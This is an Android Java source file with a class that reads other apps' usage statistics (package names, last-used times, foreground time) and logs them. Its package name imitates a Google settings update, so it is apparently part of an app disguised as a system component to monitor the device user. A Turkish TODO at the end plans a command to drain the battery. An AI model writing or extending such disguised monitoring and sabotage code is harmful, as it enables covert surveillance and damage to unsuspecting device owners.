package com.setting.dl.google.googlesettingupdate.usage;

import android.annotation.SuppressLint;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.os.Build;

import com.annimon.stream.Stream;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.u;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class UsageManager {
   
   
   private final  Context       context;
   private static WeakReference<UsageManager>  usageManager;
   private static final Object OBJECT = new Object();
   private UsageStatsManager usageStatsManager;
   
   
   @SuppressLint("WrongConstant")
   private UsageManager(Context context) {
      this.context = context;
   
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
         usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
      }
      else{
   
         usageStatsManager = (UsageStatsManager) context.getSystemService("usagestats");
      }
   }
   
   public static UsageManager getInstance(Context context) {
   
      if (usageManager == null || usageManager.get() == null) {
   
         synchronized (OBJECT) {
   
            if (usageManager == null || usageManager.get() == null) {
               
               usageManager = new WeakReference<>(new UsageManager(context));
            }
         }
      }
      
      return usageManager.get();
   }
   
   public List<UsageStats> getLastUsageStats(long timeAgoMilis){
   
      if(usageStatsManager == null) return new ArrayList<>();
      
      long time1 = Calendar.getInstance().getTimeInMillis();
      long time2 = time1 - TimeUnit.MINUTES.toMillis(30);
   
   
      List<UsageStats> stats =  usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_DAILY,
            time2,
            time1);
      
      long iwant = System.currentTimeMillis() - timeAgoMilis;
      
      return Stream.of(stats).filter(c -> c.getLastTimeUsed() >= iwant).toList();
   }
   
   public List<UsageStats> getAllUsage(){
   
      if(usageStatsManager == null) return new ArrayList<>();
   
      long time1 = Calendar.getInstance().getTimeInMillis();
      long time2 = time1 - TimeUnit.DAYS.toMillis(120);
      
      return usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_YEARLY,
            time2,
            time1);
   }
   
   public void test(){
   
      if(usageStatsManager == null) return;
      
      long time = Calendar.getInstance().getTimeInMillis();
      long timeAgo = time - TimeUnit.MINUTES.toMillis(5);
      long timeAgo2 = time - TimeUnit.MINUTES.toMillis(1);
      
      List<UsageStats> stats = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_DAILY,
            timeAgo, 
            time);
   
   
      u.log.d("Stats count : %d", stats.size());
   
   
      for (UsageStats usageStat : stats) {
   
         if (usageStat.getLastTimeUsed() >= timeAgo2) {
   
            
            u.log.d("%s", usageStat.getPackageName());
            u.log.d("first stamp : %s", Time.getDate(usageStat.getFirstTimeStamp()));
            u.log.d("last stamp  : %s", Time.getDate(usageStat.getLastTimeStamp()));
            u.log.d("last used   : %s", Time.getDate(usageStat.getLastTimeUsed()));
            u.log.d("forground   : %s", Time.getElapsedTime(usageStat.getTotalTimeInForeground()));
            u.log.d("=============================================\n");
         }
         
         
         
      }
      
      
   }
   
   //todo bataryayı tüketecek bir komut yaz
}
